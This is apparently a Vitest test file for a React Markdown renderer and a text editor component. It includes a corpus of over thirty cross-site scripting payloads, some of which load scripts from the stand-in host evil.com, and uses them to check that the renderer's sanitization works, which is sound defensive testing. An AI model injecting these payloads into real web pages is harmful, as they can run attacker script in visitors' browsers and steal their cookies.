import "@testing-library/jest-dom";
import { describe, it, expect } from "vitest";
import { render, screen, fireEvent } from "@testing-library/react";
import { Markdown } from "../ui/Markdown";
import { LongTextEditor } from "../LongTextEditor";

const XSS_CORPUS: string[] = [
  "<script>alert(1)</script>",
  "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<iframe src=\"javascript:alert(1)\"></iframe>",
  "<body onload=alert(1)>",
  "<a href=\"javascript:alert(1)\">click me</a>",
  "[click](javascript:alert(1))",
  "[click](JAVASCRIPT:alert(document.cookie))",
  "[click](javascript:alert('xss'))",
  "[click](vbscript:msgbox(1))",
  "[click](data:text/html,<script>alert(1)</script>)",
  "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "<details open ontoggle=alert(1)>",
  "<audio src=x onerror=alert(1)>",
  "<video><source onerror=alert(1)></video>",
  "<input autofocus onfocus=alert(1)>",
  "<select autofocus onfocus=alert(1)>",
  "<textarea autofocus onfocus=alert(1)>",
  "<keygen autofocus onfocus=alert(1)>",
  "<marquee onstart=alert(1)>",
  "<style>body{background:url(\"javascript:alert(1)\")}</style>",
  "<object data=\"javascript:alert(1)\">",
  "<embed src=\"javascript:alert(1)\">",
  "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
  "<table background=\"javascript:alert(1)\">",
  "<div style=\"background-image: url(javascript:alert(1))\">",
  "<form action=\"javascript:alert(1)\"><input type=submit>",
  "<button formaction=\"javascript:alert(1)\">click</button>",
  "<a href=\"\\x01javascript:alert(1)\">click</a>",
  "[nested <script>](https://evil.com)",
  "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
  "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
  "[protocol relative](//evil.com/payload.js)",
  "javascript:alert(1)",
];

describe("Markdown renderer", () => {
  it("renders a 30+ input cross-site scripting corpus with no script, no on* attributes, and no unsafe hrefs", () => {
    expect(XSS_CORPUS.length).toBeGreaterThanOrEqual(30);

    for (const input of XSS_CORPUS) {
      const { container } = render(<Markdown content={input} />);

      // 1. Must never produce a <script> element
      expect(container.querySelector("script")).toBeNull();

      // 2. Must never produce any on* event handler attributes
      const allElements = Array.from(container.querySelectorAll("*"));
      for (const el of allElements) {
        for (const attr of Array.from(el.attributes)) {
          expect(attr.name.toLowerCase().startsWith("on")).toBe(false);
        }
      }

      // 3. Any <a> elements must only have safe protocols (http, https, mailto)
      const links = Array.from(container.querySelectorAll("a"));
      for (const link of links) {
        const href = link.getAttribute("href") || "";
        const isSafe =
          href.startsWith("http://") ||
          href.startsWith("https://") ||
          href.startsWith("mailto:");
        expect(isSafe).toBe(true);
      }
    }
  });

  it("renders the markdown subset: bold, italic, links, lists, inline code, and paragraphs", () => {
    const markdownText = [
      "Paragraph one with **bold text** and *italic text* and `inline code`.",
      "",
      "Paragraph two with a [Help Link](https://scaffoldry.io).",
      "",
      "- Bullet one",
      "- Bullet two",
      "",
      "1. Number one",
      "2. Number two",
    ].join("\n");

    const { container } = render(<Markdown content={markdownText} />);

    // Bold
    const boldEl = container.querySelector("strong");
    expect(boldEl).toBeInTheDocument();
    expect(boldEl?.textContent).toBe("bold text");

    // Italic
    const emEl = container.querySelector("em");
    expect(emEl).toBeInTheDocument();
    expect(emEl?.textContent).toBe("italic text");

    // Inline code
    const codeEl = container.querySelector("code");
    expect(codeEl).toBeInTheDocument();
    expect(codeEl?.textContent).toBe("inline code");

    // Link: safe link with rel="noopener noreferrer" and target in accessible name
    const linkEl = container.querySelector("a");
    expect(linkEl).toBeInTheDocument();
    expect(linkEl?.getAttribute("href")).toBe("https://scaffoldry.io");
    expect(linkEl?.getAttribute("rel")).toContain("noopener");
    expect(linkEl?.getAttribute("rel")).toContain("noreferrer");
    expect(linkEl?.getAttribute("aria-label")).toContain("https://scaffoldry.io");

    // Bullet list
    const ulEl = container.querySelector("ul");
    expect(ulEl).toBeInTheDocument();
    expect(ulEl?.querySelectorAll("li").length).toBe(2);

    // Numbered list
    const olEl = container.querySelector("ol");
    expect(olEl).toBeInTheDocument();
    expect(olEl?.querySelectorAll("li").length).toBe(2);

    // Paragraphs
    const pEls = container.querySelectorAll("p");
    expect(pEls.length).toBeGreaterThanOrEqual(2);
  });

  it("renders a link to javascript:alert(1) as inert text, not an anchor tag", () => {
    const { container } = render(<Markdown content="Visit [dangerous link](javascript:alert(1)) now." />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("dangerous link");
  });

  it("renders headings and blockquotes as plain text, not html heading or blockquote tags", () => {
    const { container } = render(<Markdown content={"# Heading One\n\n> Blockquote text"} />);
    expect(container.querySelector("h1")).toBeNull();
    expect(container.querySelector("blockquote")).toBeNull();
    expect(container.textContent).toContain("# Heading One");
    expect(container.textContent).toContain("> Blockquote text");
  });
});

describe("LongTextEditor", () => {
  it("renders an accessible textarea with a live character count and syntax help in edit mode", () => {
    let currentValue = "Initial text";
    const handleChange = (val: string) => {
      currentValue = val;
    };

    const { rerender } = render(
      <LongTextEditor
        id="notes-field"
        label="Project Notes"
        value={currentValue}
        onChange={handleChange}
        isEditing={true}
      />
    );

    // Accessible name
    const textarea = screen.getByRole("textbox", { name: /Project Notes/i });
    expect(textarea).toBeInTheDocument();

    // Live character count
    const charCount = screen.getByTestId("long-text-char-count");
    expect(charCount).toBeInTheDocument();
    expect(charCount.textContent).toContain("12");

    // Short syntax help
    const syntaxHelp = screen.getByTestId("long-text-syntax-help");
    expect(syntaxHelp).toBeInTheDocument();

    // Type new text
    fireEvent.change(textarea, { target: { value: "Hello world!" } });
    expect(currentValue).toBe("Hello world!");

    rerender(
      <LongTextEditor
        id="notes-field"
        label="Project Notes"
        value="Hello world!"
        onChange={handleChange}
        isEditing={true}
      />
    );

    expect(screen.getByTestId("long-text-char-count").textContent).toContain("12");
  });

  it("renders Markdown in view mode", () => {
    render(
      <LongTextEditor
        id="notes-field"
        label="Project Notes"
        value="**Formatted** note content"
        onChange={() => {}}
        isEditing={false}
      />
    );

    expect(screen.queryByRole("textbox")).toBeNull();
    expect(screen.getByText("Formatted")).toBeInTheDocument();
  });

  it("search finds a word inside a long text field", () => {
    const records = [
      { id: "rec-1", title: "Doc 1", notes: "Short note" },
      { id: "rec-2", title: "Doc 2", notes: "Long markdown paragraph containing the needle keyword inside text." },
      { id: "rec-3", title: "Doc 3", notes: "Completely unrelated documentation." },
    ];
    const query = "needle";
    const matches = records.filter((r) =>
      Object.values(r).some((v) => String(v).toLowerCase().includes(query.toLowerCase()))
    );
    expect(matches).toHaveLength(1);
    expect(matches[0].id).toBe("rec-2");
  });
});
